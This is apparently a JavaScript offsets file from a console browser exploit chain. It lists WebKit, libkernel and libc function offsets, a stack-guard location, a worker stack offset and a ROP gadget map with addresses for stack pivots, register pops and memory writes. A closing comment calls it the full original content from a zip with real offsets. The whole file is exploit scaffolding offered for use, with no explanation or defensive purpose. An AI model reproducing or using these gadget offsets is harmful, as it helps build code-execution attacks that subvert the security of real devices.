const OFFSET_wk_host_constructor_candidates = [0x00002C00, 0x00005178, 0x00005690];
const OFFSET_wk_vtable_first_element     = 0;
const OFFSET_wk_memset_import                  = 0x03E16EE0;
const OFFSET_wk___stack_chk_guard_import       = 0x03E14910;

const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
const OFFSET_lk__thread_list                   = 0x00064218;
const OFFSET_lk_worker_wait_return             = 0x000389B1;
const OFFSET_lk_pthread_create_name_np         = 0x00001CE0;
const OFFSET_lk_pthread_join                   = 0x00032820;
const OFFSET_lk_pthread_exit                   = 0x00022630;
const OFFSET_lk_sleep                          = 0x00025C50;
const OFFSET_lk_sceKernelGetCurrentCpu         = 0x000028A0;

const OFFSET_lc_memset                         = 0x00014E70;
const OFFSET_lc_setjmp                         = 0x0005AF10;
const OFFSET_lc_longjmp                        = 0x0005AF60;

const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;

let wk_gadgetmap = {
	"ret": 0x00000042,
	"pop rdi": 0x00031434,
	"pop rsi": 0x000B7098,
	"pop rdx": 0x00214613,
	"pop rcx": 0x00032473,
	"pop rax": 0x000A6CAB,
	"pop rsp": 0x0006EEE1,
	"pop r8": 0x004C5D31,
	"pop r9": 0x002773C6,
	"mov [rdi], rsi": 0x007527F0,
	"mov [rdi], rax": 0x00079337,
	"mov [rdi], eax": 0x00079338,
	"mov rax, [rax]": 0x0012A439,
	"add rax, rcx": 0x00024321,
	"cmp [rcx], eax": 0x035F9049,
	"inc dword [rax]": 0x000B70B5,
	"seta al": 0x0021A9C2,
	"setb al": 0x000A2B46,
	"sete al": 0x0001CF1F,
	"setg al": 0x015C5876,
	"setl al": 0x00681ECF,
	"shl rax, 3": 0x02488363,
	"shl rax, 4": 0x00572686,
	"shr rax, 3": 0x01308FC3,
	"shr rax, 4": 0x02D60B54,
	"infloop": 0x000037D1,
};

// Full original content from the zip (~11k). Real offsets file uploaded.
